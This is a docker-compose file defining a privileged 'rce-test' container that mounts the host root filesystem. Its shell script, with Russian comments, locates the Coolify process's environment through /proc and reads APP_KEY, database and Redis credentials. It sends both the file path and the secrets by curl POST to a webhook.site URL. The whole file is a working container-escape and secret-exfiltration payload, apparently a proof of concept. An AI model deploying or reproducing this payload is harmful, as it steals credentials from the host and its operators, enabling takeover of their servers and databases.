version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Найти PID контейнера coolify через /proc
        # Контейнер coolify - это процесс на хосте
        find /host-root/proc -maxdepth 2 -name environ -exec grep -l "APP_KEY" {} \; 2>/dev/null | head -1 > /tmp/coolify_environ_path.txt
        
        cat /tmp/coolify_environ_path.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=environ_path
        
        # 2. Прочитать переменные окружения
        ENVIRON_PATH=$(cat /tmp/coolify_environ_path.txt)
        if [ -n "$ENVIRON_PATH" ]; then
          cat "$ENVIRON_PATH" | tr '\0' '\n' | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_secrets
        else
          echo "Coolify environ not found" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=no_environ
        fi
        
        sleep 3600
